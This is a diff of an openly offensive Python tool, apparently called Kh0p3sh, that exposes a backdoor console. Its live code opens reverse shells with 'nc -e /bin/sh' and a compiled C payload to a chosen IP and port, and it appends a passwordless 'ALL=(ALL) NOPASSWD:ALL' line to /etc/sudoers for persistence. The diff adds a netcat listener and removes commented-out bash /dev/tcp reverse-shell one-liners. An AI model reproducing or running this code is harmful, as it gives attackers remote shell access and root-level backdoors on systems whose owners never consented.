@@ -145,6 +145,7 @@ Backdoor Commands:
 
 return - to return to the normal program
 reverse - to be launched into the reverse shell setup
+listen - to launch a netcat listener
 sudo - to infect the sudoers file 
 
         ''')
@@ -158,9 +159,7 @@ sudo - to infect the sudoers file
             print('''
 Welcome to the reverse shell console!
 
-bash {ip} {port} - will attempt to setup a reverse bash shell on that specific port and listening on that specific IP
 nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific port
-py {ip} {port} - will attempt to setup a reverse python3 shell on that specific port
 C {ip} {port} - will attempt to setup a reverse C shell on that specific port
 
             ''')
@@ -170,18 +169,9 @@ C {ip} {port} - will attempt to setup a reverse C shell on that specific port
                 print('you do not have enough arguments!')
                 revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
                 revCommand = str(revCommand).split()
-            # if revCommand[0] == 'bash':
-            #     print('Attempting to create bash reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
-            #     # 0<&196;exec 196<>/dev/tcp/192.168.75.1/4444; sh <&196 >&196 2>&196
-            #     # bash -i >& /dev/tcp/192.168.75.1/4444 0>&1
-            #     # print('bash -i >& /dev/tcp/' + revCommand[1] + '/' + revCommand[2] + ' 0>&1')
-            #     os.system('bash -i >& /dev/tcp/{}/{} 0>&1'.format(revCommand[1], revCommand[2]))
             if revCommand[0] == 'nc':
                 print('Attempting to create netcat reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
                 os.system('nc -e /bin/sh {} {}'.format(revCommand[1], revCommand[2]))
-            # if revCommand[0] == 'py':
-            #     print('Attempting to create python reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
-            #     os.system('nc -e /bin/sh {} {}'.format(revCommand[1], revCommand[2]))
             if revCommand[0] == 'C':
                 print('Attempting to create C reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
                 os.system('rm -rf back.c && touch back.c')
@@ -230,7 +220,10 @@ int main(void){
             try:
                 os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
             except: print('There was an error attempting to create a sudoers backdoor!')
-
+        if str(backCommand) == 'listen':
+            print('What port?')
+            lisCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'listen\033[0m' + '>')
+            os.system('nc -lnvp ' + lisCommand)
 #################END OF PERSISTENCE COMMANDS##################
 
     else:
